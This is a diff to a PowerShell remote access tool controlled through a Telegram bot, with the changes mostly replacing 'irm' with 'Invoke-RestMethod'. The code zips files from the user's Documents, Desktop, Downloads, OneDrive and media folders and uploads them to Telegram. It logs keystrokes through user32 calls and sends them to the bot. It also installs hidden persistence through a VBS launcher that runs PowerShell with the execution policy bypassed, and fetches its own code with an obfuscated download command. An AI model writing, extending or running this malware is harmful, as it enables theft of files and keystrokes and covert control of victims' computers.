@@ -6,7 +6,7 @@ $apiUrl = "https://api.telegram.org/bot$Token/sendMessage"
 $AcceptedSession=""
 $LastUnAuthenticatedMessage=""
 $lastexecMessageID=""
-$Token = "$tg"
+$Token = "$tg" 
 $tick = [char]::ConvertFromUtf32(0x2705)
 $comp = [char]::ConvertFromUtf32(0x1F4BB)
 $closed = [char]::ConvertFromUtf32(0x274C)
@@ -14,17 +14,19 @@ $waiting = [char]::ConvertFromUtf32(0x1F55C)
 $glass = [char]::ConvertFromUtf32(0x1F50D)
 $cmde = [char]::ConvertFromUtf32(0x1F517)
 $pause = [char]::ConvertFromUtf32(0x23F8)
+
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.ps1"){rm -path "$env:APPDATA\Microsoft\Windows\temp.ps1" -Force}
 if(Test-Path "$env:APPDATA\Microsoft\Windows\temp.vbs"){rm -path "$env:APPDATA\Microsoft\Windows\temp.vbs" -Force}
 Sleep 10
-$updates = irm -Uri ($url + "/getUpdates")
+$updates = Invoke-RestMethod -Uri ($url + "/getUpdates")
 if ($updates.ok -eq $true) {$latestUpdate = $updates.result[-1]
 if ($latestUpdate.message -ne $null){$chatID = $latestUpdate.message.chat.id;Write-Host "Chat ID: $chatID"}}
 $mts = New-Object psobject 
 $mts | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
+$scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
 $contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
 $params = @{chat_id = $ChatID ;text = $contents}
-irm -Uri $apiUrl -Method POST -Body $params
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 
 Function Options{
 $contents = "==============================================
@@ -53,7 +55,7 @@ Kill    : Killswitch for 'KeyCapture' and 'Exfiltrate'
 
 =============================================="
 $params = @{chat_id = $ChatID ;text = $contents}
-irm -Uri $apiUrl -Method POST -Body $params | Out-Null
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
 
 Function ExtraInfo{
@@ -82,13 +84,13 @@ Use 'FolderTree' command to show all files
 
 =============================================="
 $params = @{chat_id = $ChatID ;text = $contents}
-irm -Uri $apiUrl -Method POST -Body $params | Out-Null
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
 }
 
 Function Close{
 $contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
 $params = @{chat_id = $ChatID ;text = $contents}
-irm -Uri $apiUrl -Method POST -Body $params
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 rm -Path "$env:temp/tgc2.txt" -Force
 exit
 }
@@ -120,7 +122,7 @@ $index = 1
 $zipFilePath ="$env:temp/Loot$index.zip"
 $contents = "$env:COMPUTERNAME $tick Exfiltration Started.. (Stop with Killswitch)"
 $params = @{chat_id = $ChatID ;text = $contents}
-irm -Uri $apiUrl -Method POST -Body $params  | Out-Null
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
 If($Path -ne $null){$foldersToSearch = "$env:USERPROFILE\"+$Path}
 else{$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")}
 If($FileType -ne $null){$fileExtensions = "*."+$FileType}
@@ -146,7 +148,7 @@ foreach ($folder in $foldersToSearch) {
                     if ($messages.message.text -contains "kill") {
                     $contents = "$comp $env:COMPUTERNAME $closed Exfiltration Killed"
                     $params = @{chat_id = $ChatID ;text = $contents}
-                    irm -Uri $apiUrl -Method POST -Body $params
+                    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
                     break
                     }
                 }
@@ -161,7 +163,7 @@ curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.
 rm -Path $zipFilePath -Force
 $contents = "$env:COMPUTERNAME $tick Exfiltration Complete!"
 $params = @{chat_id = $ChatID ;text = $contents}
-irm -Uri $apiUrl -Method POST -Body $params  | Out-Null
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
 }
 
 
@@ -182,7 +184,7 @@ Remove-Item -Path $filePath
 Function KeyCapture {
 $contents = "$env:COMPUTERNAME $tick KeyCapture Started.. (Stop with Killswitch)"
 $params = @{chat_id = $ChatID ;text = $contents}
-irm -Uri $apiUrl -Method POST -Body $params
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
 $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
@@ -216,7 +218,7 @@ While ($true){
         if ($messages.message.text -contains "kill") {
         $contents = "$comp $env:COMPUTERNAME $closed KeyCapture Killed"
         $params = @{chat_id = $ChatID ;text = $contents}
-        irm -Uri $apiUrl -Method POST -Body $params | Out-Null
+        Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
         break
         }
     }
@@ -226,7 +228,7 @@ While ($true){
             $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
             $contents = "$glass Keys Captured : "+$escmsgsys
             $params = @{chat_id = $ChatID ;text = $contents}
-            irm -Uri $apiUrl -Method POST -Body $params | Out-Null
+            Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
             $keyPressed = $false
             $nosave = ""
         }
@@ -352,11 +354,11 @@ $paramers = @{
     text = $messagehead
     reply_markup = $inlineKeyboardJson
 }
-irm -Uri $apiUrl -Method POST -ContentType "application/json" -Body ($paramers | ConvertTo-Json -Depth 10)
+Invoke-RestMethod -Uri $apiUrl -Method POST -ContentType "application/json" -Body ($paramers | ConvertTo-Json -Depth 10)
 $killint = 0
 $offset = 0
 while ($killint -eq 0) {
-    $updates = irm -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset" -Method Get
+    $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset" -Method Get
     foreach ($update in $updates.result) {
         $offset = $update.update_id + 1
         Sleep 1
@@ -372,7 +374,7 @@ while ($killint -eq 0) {
 }
 $contents = "$comp $env:COMPUTERNAME $tick Session Started"
 $params = @{chat_id = $ChatID ;text = $contents}
-irm -Uri $apiUrl -Method POST -Body $params
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 }
 
 Function FolderTree{
@@ -419,14 +421,15 @@ Write-Output "Uninstalled."
 Function PauseSession{
 $contents = "$env:COMPUTERNAME $pause Pausing Session.."
 $params = @{chat_id = $ChatID ;text = $contents}
-irm -Uri $apiUrl -Method POST -Body $params
+Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
 $newScriptPath = "$env:APPDATA\Microsoft\Windows\temp.ps1"
-
-"`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
-"`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
-i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
-Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
-
+$scriptContent | Out-File -FilePath $newScriptPath -force
+if ($newScriptPath.Length -lt 100){
+    "`$tg = `"$tg`"" | Out-File -FilePath $newScriptPath -Force
+    "`$gh = `"$gh`"" | Out-File -FilePath $newScriptPath -Append
+    i`wr -Uri "$parent" -OutFile "$env:temp/temp.ps1"
+    Get-Content -Path "$env:temp/temp.ps1" | Out-File $newScriptPath -Append
+    }
 $tobat = @'
 Set objShell = CreateObject("WScript.Shell")
 objShell.Run "powershell.exe -NonI -NoP -Exec Bypass -W Hidden -File ""%APPDATA%\Microsoft\Windows\temp.ps1""", 0, True
@@ -443,12 +446,12 @@ Function IsAdmin{
 If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
     $contents = "$closed Current Session is NOT Admin $closed"
     $params = @{chat_id = $ChatID ;text = $contents}
-    irm -Uri $apiUrl -Method POST -Body $params | Out-Null
+    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
     }
     else{
     $contents = "$tick Current Session IS Admin $tick"
     $params = @{chat_id = $ChatID ;text = $contents}
-    irm -Uri $apiUrl -Method POST -Body $params | Out-Null
+    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
     }
 }
 
@@ -473,14 +476,14 @@ If($global:errormsg -eq 0){
     $global:errormsg = 1
     $contents = "$tick Error Messaging ON $tick"
     $params = @{chat_id = $ChatID ;text = $contents}
-    irm -Uri $apiUrl -Method POST -Body $params | Out-Null
+    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
     return
     }
 If($global:errormsg -eq 1){
     $global:errormsg = 0
     $contents = "$closed Error Messaging OFF $closed"
     $params = @{chat_id = $ChatID ;text = $contents}
-    irm -Uri $apiUrl -Method POST -Body $params | Out-Null
+    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
     return
     }
 }
@@ -493,7 +496,7 @@ param($CheckMessage)
         $script:AcceptedSession="Authenticated"
         $contents = "$comp $env:COMPUTERNAME $tick Session Starting..."
         $params = @{chat_id = $ChatID ;text = $contents}
-        irm -Uri $apiUrl -Method POST -Body $params
+        Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
         ShowButtons
         return $messages.message.chat.id
     }Else{return 0}
@@ -554,4 +557,3 @@ $messages=rtgmsg
         }
     }
 }
-
